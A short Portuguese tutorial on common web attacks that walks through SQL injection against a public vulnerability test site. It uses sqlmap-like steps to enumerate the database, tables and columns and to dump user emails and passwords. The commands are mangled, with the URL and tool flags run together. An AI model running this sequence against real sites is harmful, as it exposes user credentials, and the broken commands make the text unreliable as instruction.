# Ataques Comuns Em Web Aplicações

Quando falamos em ataques em web sites pensamos que é um ataque dificil de ser executado, mais é tao simples quanto parece citaremos alguns ataques mais comuns feitos por Grupo , ou indivíduos em sistemas on-line ...


# Lulzsec um grupo que atuou em meados de 2011 atingindo alguns sistemas grandes em um dos seus ataques conseguiram extrair o banco de dados da sony networking, este ataque foi um SQl Injection Ou Sqli vamos fazer uma demonstração de como fuinciona

vamos usar um site de teste lembrando-se a ferramenta usada aqui sera o Scanner Sql Map Otima ferramenta pra test de vulnerabilidade sqli

aqui é listado o nome da data base
http://testphp.vulnweb.com/artists.php?artist=1+AND+1=1 --dbs

aqui vemos que foi extraído a data base agora vamos lista as tabelas
http://testphp.vulnweb.com/artists.php?artist=1+AND+1=1 -D acuart --tables

Feito isso agora vamos listar a coluna
http://testphp.vulnweb.com/artists.php?artist=1+AND+1=1 -D acuart -T users --columns

Feito isso vamos listar o e-mail senha e usuário da database e assim concluir com a invasão
http://testphp.vulnweb.com/artists.php?artist=1+AND+1=1 -D acuart -T users -C email,name,pass --dump

Oque podemos levar em conta com este ataque por ser antigo até hoje em 2023 vemos que a syntaxe do Sql continua vulnerável em muitos sites , isso é culpa de quem ?
